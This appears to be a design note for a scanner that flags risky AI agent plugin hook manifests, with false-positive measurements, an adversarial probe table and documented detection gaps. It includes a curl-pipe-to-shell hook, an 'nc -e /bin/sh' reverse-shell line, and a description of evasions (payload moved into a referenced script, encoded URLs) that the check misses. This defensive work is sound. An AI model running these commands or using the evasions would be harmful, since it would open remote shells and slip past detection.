# Plugin hook manifests

A plugin manifest that registers a command against an agent event. Enabling the
plugin is the trigger — there is no install to gate and no prompt.

## Why this class exists

`SessionStart` runs on startup, on `/clear` and on compaction. A plugin that
declares one has code execution from the moment it is enabled, before the user
types anything. That is strictly more dangerous than a `SKILL.md`, which at
least needs the agent to choose to read it, and it was filed out of scope during
PR #86 and left unvetted since.

It is the same class as `agent-autorun` one layer up. That one was added after
the Keyv/Cacheable campaign was found using `.claude/settings.json` in the wild.

## The two real shapes

Taken from the plugins actually installed on a developer machine, not from docs:

| Path | What it is |
|---|---|
| `hooks/*hooks*.json` | the conventional `hooks.json` — but a manifest's `"hooks"` may point at any file in that directory |
| `.<runtime>-plugin/plugin.json` | the manifest itself, which may declare hooks inline |

The filename is matched loosely because the real ones are not consistent. Across
66 manifests on one machine: `hooks.json`, `claude-codex-hooks.json`,
`hooks-cursor.json`, `copilot-hooks.json`. `.claude-plugin`, `.codex-plugin` and
`.devin-plugin` all ship side by side in the same repo.

`hooks/` alone was too wide, and the reason is not hypothetical: a React
project's `src/hooks/index.json` would have been claimed, and an unparseable one
returns a warn — a false ASK on somebody's ordinary source tree. The filename has
to say `hooks` too.

## False-positive cost, measured

Every plugin manifest installed on this machine, run through the check:

- **66** manifests matched
- **0** flagged

The benign norm is a hook that runs a script from inside its own directory,
guarded on `CLAUDE_PLUGIN_ROOT`, touching no network. `benign-guarded-local/` is
modelled on a real one.

## Adversarial pass

| Probe | Result |
|---|---|
| `curl … \| sh` in a SessionStart hook | **flagged** |
| `bash "$CLAUDE_PLUGIN_ROOT/hooks/guard.sh"` (the benign norm) | silent — correct |
| `"hooks": "./hooks/x.json"` string pointer | silent — the manifest runs nothing; the file it names is claimed on its own path |
| `"hooks": {}` / `123` / `[]` / a string where a group belongs | silent, no throw |
| Payload moved into the referenced `.sh` | **silent here** — see below |
| Hex-escaped or base64-assembled URL | **silent** — see below |
| `nc -e /bin/sh 10.0.0.1 4444` | **silent** — see below |

## KNOWN GAP — the benign shape is also the evasion

The legitimate norm is `bash "$ROOT/hooks/guard.sh"`, so an attacker writes
exactly that and puts the payload in the `.sh`. The manifest is then clean by
inspection and this check says nothing about it.

It is narrower than it sounds. `pickFiles` scores `.sh` files into the repo
scan, so `hooks/setup.sh` **is** collected and judged during `scan_repo` — the
gap is the Write/Edit hook path, which evaluates only the file being written.
Writing the manifest is silent; writing the payload is a separate event the
judge does see.

## KNOWN GAP — only a literal fetch is recognised

`fetchesRemoteCode` matches `curl`, `wget` and a bare URL. A hex-escaped URL, a
base64 blob piped to `sh`, and `nc -e /bin/sh` all walk past it. Widening it is
not free: it is shared with `mcpServerFindings` and with `.claude/settings.json`,
so a looser pattern buys coverage here and false positives in two shipped
detections at once. Left as it is, deliberately, and recorded rather than
quietly carried.

## Ceiling ASK, never BLOCK

A text read of a config nobody has executed. A false BLOCK on somebody's own
plugin is how a gate gets uninstalled, and every finding here is `warn`.

## Fixtures

| File | What it is |
|---|---|
| `sessionstart-remote-fetch/hooks/hooks.json` | SessionStart hook that pipes a remote script to `sh` |
| `plugin-json-inline-hook/.claude-plugin/plugin.json` | the same thing declared inline in the manifest |
| `benign-guarded-local/hooks/hooks.json` | Control — the real shape: `CLAUDE_PLUGIN_ROOT`-guarded, local, no network |
| `benign-hooks-pointer/.claude-plugin/plugin.json` | Control — `"hooks"` as a string path, which is real and common |
| `benign-no-hooks/.claude-plugin/plugin.json` | Control — an empty `hooks` object, also real |

Commands point at `REDACTED.example` and nothing here is executable.
